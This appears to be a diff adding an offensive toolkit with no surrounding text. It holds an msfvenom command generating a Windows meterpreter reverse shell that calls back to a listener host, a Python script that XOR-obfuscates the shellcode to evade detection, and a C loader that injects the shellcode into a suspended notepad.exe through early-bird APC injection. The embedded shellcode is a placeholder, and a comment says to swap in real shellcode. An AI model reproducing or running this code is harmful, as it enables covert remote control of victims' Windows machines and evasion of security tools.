@@ -1,0 +1,108 @@
+#----- generate shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.88.122 LPORT=443 -f raw -o shellcode.bin
+
+#----- xor_encoder.py shellcode.bin
+import sys
+
+def xor_encode(shellcode_bytes, key=0xAA):
+    encoded = bytearray()
+    for b in shellcode_bytes:
+        encoded.append(b ^ key)
+    return encoded
+
+def to_c_array(data):
+    return ', '.join(f'0x{b:02x}' for b in data)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Usage: python xor_encoder.py <raw_shellcode.bin>")
+        sys.exit(1)
+
+    input_file = sys.argv[1]
+
+    with open(input_file, 'rb') as f:
+        raw = f.read()
+
+    encoded = xor_encode(raw)
+    print("[+] XOR encoded shellcode (paste this into C):\n")
+    print("unsigned char xor_shellcode[] = {")
+    print("    " + to_c_array(encoded))
+    print("};")
+
+#----- cl.exe iject.c
+#include <windows.h>
+#include <stdio.h>
+
+// XOR decryption key
+#define XOR_KEY 0xAA
+
+// XOR-encoded shellcode (this is dummy shellcode - replace with real encoded shellcode)
+unsigned char xor_shellcode[] = {
+    0x90 ^ XOR_KEY, 0x90 ^ XOR_KEY, 0x90 ^ XOR_KEY, 0xC3 ^ XOR_KEY  // NOP NOP NOP RET
+};
+
+// Decrypts the shellcode in-place
+void DecryptShellcode(unsigned char* data, SIZE_T len) {
+    for (SIZE_T i = 0; i < len; i++) {
+        data[i] ^= XOR_KEY;
+    }
+}
+
+int main() {
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    LPVOID remoteMemory;
+    SIZE_T shellcodeSize = sizeof(xor_shellcode);
+
+    si.cb = sizeof(si);
+
+    // Step 1: Create the target process suspended
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
+        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("[-] Failed to create process. Error: %lu\n", GetLastError());
+        return -1;
+    }
+
+    printf("[+] Created suspended process (PID: %lu)\n", pi.dwProcessId);
+
+    // Step 2: Decrypt shellcode
+    DecryptShellcode(xor_shellcode, shellcodeSize);
+    printf("[+] Shellcode decrypted in memory.\n");
+
+    // Step 3: Allocate memory in remote process
+    remoteMemory = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!remoteMemory) {
+        printf("[-] VirtualAllocEx failed. Error: %lu\n", GetLastError());
+        return -1;
+    }
+
+    // Step 4: Write shellcode to remote process memory
+    if (!WriteProcessMemory(pi.hProcess, remoteMemory, xor_shellcode, shellcodeSize, NULL)) {
+        printf("[-] WriteProcessMemory failed. Error: %lu\n", GetLastError());
+        return -1;
+    }
+
+    printf("[+] Shellcode written to remote memory at: %p\n", remoteMemory);
+
+    // Step 5: Queue shellcode with APC
+    if (!QueueUserAPC((PAPCFUNC)remoteMemory, pi.hThread, NULL)) {
+        printf("[-] QueueUserAPC failed. Error: %lu\n", GetLastError());
+        return -1;
+    }
+
+    printf("[+] Shellcode queued via APC.\n");
+
+    // Step 6: Resume the thread, triggering the APC
+    ResumeThread(pi.hThread);
+    printf("[+] Thread resumed, shellcode should now execute.\n");
+
+    // Optional: Wait for the remote process to finish
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Cleanup
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    return 0;
+}
